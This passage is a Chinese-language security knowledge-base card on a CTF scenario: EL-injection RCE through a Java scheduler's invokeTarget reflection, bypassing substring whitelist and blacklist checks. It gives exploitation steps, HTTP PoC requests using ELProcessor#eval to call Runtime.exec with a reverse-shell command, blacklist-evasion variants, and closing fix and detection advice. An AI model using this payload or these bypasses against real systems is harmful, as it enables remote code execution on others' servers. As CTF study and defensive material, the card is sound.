---
id: web-java-expression-invoketarget-whitelist-substring-elprocessor-el-rce
title: 定时任务 invokeTarget 白名单子串 + 黑名单遗漏：ELProcessor#eval EL 注入 RCE
type: scenario
domain: web
path: web/java/expression
technique: invoke-target-whitelist-substring-elprocessor-el-rce
tags:
- java
- el-injection
- expression-injection
- reflection
- scheduler
- rce
- blacklist-bypass
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V224
  verified_at: '2026-11-07T07:03:09+08:00'
  notes: 已对照 content.md 与 5/5 张图核对：job/add、job/run 入口与原文 @PostMapping 一致（原文 PoC 使用 /api 前缀）；JOB_BLACKLIST/JOB_WHITELIST 逐字符串一致，invokeMethod 的 className#method(params) 解析、getMethod/getDeclaredMethod+setAccessible、String/Integer/Boolean 参数类型与原文一致；图 02 DangerousMethods 查询含 javax.el.ELProcessor.eval，PoC 用 ELProcessor#eval 集合字面量 + '' getClass().forName 反射 Runtime.exec，图 03 显示 java.lang.ProcessImpl、图 04 反弹 shell 读到 flag；黑名单未覆盖 javax.el.ELProcessor、白名单仅大小写敏感 contains，绕过判定成立。已修正变体段中原文未出现且 Tomcat EL 实现无此类的 org.apache.el.ELProcessor 表述。与 RuoYi invokeTarget 卡 dedup 为 related；dup-scan 与 18907 命令队列卡为 related，入口/过滤/sink 均不同，保留。未验证点：PoC 未在本机复跑；CTF 应用无受影响版本，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/java/expression/web-java-expression-invoketarget-whitelist-substring-elprocessor-el-rce/
draft: false
kb_aliases:
- invokeTarget 黑白名单绕过
- job add EL 注入
- ELProcessor eval RCE
- com.jabaez.FLAG 白名单绕过
- 定时任务反射调用 EL 注入
---

## 一句话结论

定时任务接口把用户填写的 `invokeTarget` 解析为 `className#method(params)` 并反射调用，同时用“黑名单子串 + 白名单子串”过滤；攻击者选择未被黑名单覆盖的 `javax.el.ELProcessor#eval(<EL 表达式>)`，把白名单要求的 `com.jabaez.FLAG` 作为 EL 表达式里的普通字符串字面量带入，即可同时通过黑白名单并在 `eval` 中执行任意 EL，最终调用 `Runtime.exec` 反弹 shell。

## 原理

- 入口 `/api/job/add` 保存 `ScheduledJob`，`/api/job/run/{jobName}` 调用 `invokeMethod(job.getInvokeTarget())`。
- 过滤逻辑：
  - 黑名单 `JOB_BLACKLIST = {"java.net.URL","javax.naming.InitialContext","org.yaml.snakeyaml","org.springframework","org.apache","rmi","ldap","ldaps","http","https"}`，对 `invokeTarget.toLowerCase()` 做 `contains` 匹配；
  - 白名单 `JOB_WHITELIST = {"com.jabaez.FLAG"}`，对原始字符串做大小写敏感的 `contains` 匹配，要求目标字符串必须包含该子串。
- `invokeMethod` 解析 `className#methodName(params)`：`Class.forName(className)`，按参数类型（String/Integer/Boolean）调用 `getMethod`，找不到再 `getDeclaredMethod` + `setAccessible(true)`，静态方法直接 `invoke(null,...)`，否则 `newInstance()` 后调用。
- 绕过点一：白名单只是“字符串包含 `com.jabaez.FLAG`”，并不要求该类真的被加载或调用；把 `'com.jabaez.FLAG'` 作为 EL 表达式中的字符串字面量即可满足检查。
- 绕过点二：黑名单只覆盖 URL/JNDI/SnakeYAML/Spring/Apache/协议等关键字，没有覆盖 `javax.el.ELProcessor`，也没有覆盖 `java.lang.Runtime`；`ELProcessor#eval(String)` 的参数类型正好是 String，可由解析器直接传入。
- EL 表达式中通过 `''.getClass().forName('java.lang.Runtime')` 反射拿到 `Runtime`，再 `getMethod('getRuntime').invoke(null)` 与 `getMethod('exec',''.getClass()).invoke(...)` 执行命令，避开对 `Runtime` 类的直接静态引用限制（取决于 EL 实现）。

## 触发条件

- 目标暴露 `/api/job/add` 与 `/api/job/run/{jobName}`，且无额外鉴权（CTF 环境如此；真实系统可能需登录）。
- `invokeTarget` 的黑名单/白名单逻辑与文章一致（黑名单遗漏 `javax.el.ELProcessor`，白名单为子串包含）。
- classpath 存在 `javax.el.ELProcessor`（Java EE/EL 3.0 实现，如 Tomcat 的 EL 实现）。
- 目标能执行反弹 shell 命令（bash 可用）或至少能执行 `touch`/`id` 等验证命令。

## 利用步骤

1. POST `/api/job/add`，`invokeTarget` 填 `javax.el.ELProcessor#eval({...})`，EL 表达式内包含 `'com.jabaez.FLAG'` 以满足白名单。
2. 表达式通过反射获取 `Runtime` 并调用 `exec`，先执行 `id` 或写文件验证；反弹 shell 用 base64 包装避免特殊字符。
3. POST `/api/job/run/aaa` 触发任务执行。
4. 在攻击端监听端口接收 shell，读取 flag/验证权限。

## PoC

```http
POST /api/job/add HTTP/1.1
Host: target:port
Content-Type: application/json

{"cronExpression":"aaa","invokeTarget":"javax.el.ELProcessor#eval({'com.jabaez.FLAG'.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'bash -c {echo,<base64反弹shell>}|{base64,-d}|{bash,-i}')})","jobName":"aaa"}
```

```http
POST /api/job/run/aaa HTTP/1.1
Host: target:port
Content-Type: application/json
```

## 变体与关联

- **其他 EL 实现**：`javax.el.ELProcessor` 不可用时，可尝试 `jakarta.el.ELProcessor`、SpEL `SpelExpressionParser`、MVEL 等未被黑名单覆盖的表达式类（注意 `org.apache` 前缀会被黑名单拦截）。
- **其他调用方式**：`invokeMethod` 支持私有方法，可调用 `getDeclaredMethod` 可达的任意类；黑名单只做字符串包含，可用大小写/注释/反射拼接绕过（如 `java.net.URL` 被拦，但 `Class.forName('java.net.'+'URL')` 不在扫描范围）。
- **关联**：[[web-java-rce-ruoyi-job-invoke-target-reflection-snakeyaml]]（同为定时任务 invokeTarget 反射调用 RCE，RuoYi 用 SnakeYAML 链且黑名单为协议关键字；本卡是无 Whitelist 绕过 + EL 注入变体）、[[web-java-expression-el-injection-waf-bypass-scanner-echo]]（JSP EL 注入与回显）。

## 检测与防御

- **修复**：不要按字符串黑/白名单过滤类名；改为“允许调用的 Bean/类 + 方法”白名单映射，禁止用户直接指定任意类；禁止 `ELProcessor`/`SpelExpressionParser`/`ScriptEngine` 等表达式执行类进入调用目标。
- **加固**：定时任务功能仅管理员可用并二次确认；对 `invokeTarget` 做结构化解析（类名、方法名、参数类型）并与允许列表精确匹配，而非 `contains`。
- **检测**：监控 `invokeTarget` 中出现 `ELProcessor`、`eval`、`Runtime`、`getRuntime`、`exec`、`forName` 等特征；审计定时任务新增与立即执行操作。
